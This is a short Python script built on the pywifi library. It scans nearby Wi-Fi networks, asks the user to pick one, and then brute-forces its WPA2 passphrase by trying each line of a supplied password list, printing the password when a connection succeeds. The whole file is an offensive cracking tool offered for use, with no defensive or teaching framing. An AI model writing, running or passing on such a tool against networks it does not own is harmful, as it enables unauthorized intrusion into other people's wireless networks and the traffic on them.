from pywifi import PyWiFi , const , Profile
from time import sleep
def cerateProfile(ssid,password):
    profile = Profile()
    profile.ssid = ssid
    profile.key = password
    profile.auth=const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    return profile
wifi = PyWiFi()
interface = wifi.interfaces()[0]
ssids =[]
profiles = []
for key , value in enumerate(interface.scan_results()):
    ssids.append(value.ssid)
    profiles.append(value)

i=0
for ssid in ssids:
    print(str(i+1),"-",ssid)
    i+=1
number = int(input("Enter a Number Options:")) -1
passlist = input("Enter a Password List: ")

passlist = open(passlist).readlines()

interface.disconnect()
for password in passlist:
    profile = cerateProfile(ssids[number],password)
    interface.add_network_profile(profile)
    interface.connect(profile)
    sleep(.5)
    if interface.status() == const.IFACE_CONNECTED:
        print("")
        print("-"*30)
        print("password Ceracked!")
        print('PASSWORD IS:{}'.format(password))
    else:
        interface.remove_network_profile(profile)
        print("testing:{}".format(password),end="")
print("")
input("press <enter> for exit")

